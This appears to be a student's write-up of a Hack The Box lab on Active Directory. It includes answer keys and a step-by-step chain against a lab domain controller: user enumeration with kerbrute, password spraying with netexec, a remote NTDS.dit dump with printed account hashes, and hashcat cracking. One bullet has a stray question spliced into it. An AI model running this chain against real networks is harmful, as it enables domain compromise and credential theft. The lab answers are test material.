
## Active Directory

- Its a network which is used to manage Windows systems.
- Once a machine gets connected to the active directory network it will ask the domain controller inside the network for authentication instead of using the SAM Database for authentication purposes.


## NTDS

- `NTDS.dit` is a database file which stores Active Directory data. This data consists of the following stuff and more :-
	- user accounts (usernames and password hashes)
	- group accounts
	- computer accountSubmit the NT hash associated with the Administrator user from the example output in the section reading.s
	- group policy objects
- This `NTDS` is maintained by a Domain Controller in the Windows Domain network which is responsible to main authorization and authentication in this network. It controls the Active Directory forest. Each domain controller has a `NTDS.dit` file which is synchronized across all Domain Controllers. 

---
## Questions and Solutions

- What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)
	- **NTDS.dit**

- Submit the NT hash associated with the Administrator user from the example output in the section reading.
	- **64f12cddaa88057e06a81b54e73b949b**

- On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)
	- **jmarston:P@ssword!**


## RESOURCES

[Username](https://hack-the-box.intercom-attachments-7.com/i/o/awwxrc0h/2166861518/96fbfb09cc462e83c1e15a41d3ab/username.list?expires=1789824600&signature=d852ca790708fe39d1a8169dc1eeaf798503c54d4dedaf3cc22ae42303e600ee&req=diEhEMF4nIReUfMW1HO4zYCKmsF72T2xXjjCueBv%2B36nopz2JRsgDQry9HRv%0AOngdh2QLzWs%3D%0A)
[Password](https://hack-the-box.intercom-attachments-7.com/i/o/awwxrc0h/2166861518/96fbfb09cc462e83c1e15a41d3ab/username.list?expires=1789824600&signature=d852ca790708fe39d1a8169dc1eeaf798503c54d4dedaf3cc22ae42303e600ee&req=diEhEMF4nIReUfMW1HO4zYCKmsF72T2xXjjCueBv%2B36nopz2JRsgDQry9HRv%0AOngdh2QLzWs%3D%0A)


#### Getting the Domain Name of the AD

```bash
$ netexec smb 10.129.202.85
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

So the domain name is `ILF.local`

#### Enumerating AD Users

```bash
$ ./kerbrute_linux_amd64 userenum --dc 10.129.202.85 -d 'ILF.local' username.list
```

We got a hit on username `jmarston`

#### Finding User Password

```bash
$ netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
...(SNIP)...
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
```

So the password for the user `jmarston` is `P@ssword!`


- Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)
	- **Winter2008**


#### Dumping NTDS Hashes Remotely

```bash
$ netexec smb 10.129.202.85 -u jmarston -p 'P@ssword!' -M ntdsutil
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\178982462
NTDSUTIL    10.129.202.85   445    ILF-DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] NTDS.dit dumped to C:\Windows\Temp\178982462
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Copying NTDS dump to /tmp/tmpg0q11tig
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] NTDS dump copied to /tmp/tmpg0q11tig
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Deleted C:\Windows\Temp\178982462 remote dump directory
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:6b74a148d53507fd3db96c73af9bcad8:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/kali/.nxc/logs/ntds/ILF-DC01_10.129.202.85_2026-09-19_093007.ntds of which 7 were added to the database
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] grep -iv disabled /home/kali/.nxc/logs/ntds/ILF-DC01_10.129.202.85_2026-09-19_093007.ntds | cut -d ':' -f1
```

#### Cracking the Hash of jstapleton

```bash
$ sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b  /usr/share/wordlists/rockyou.txt
```

After cracking the hash we got the password => `Winter2008`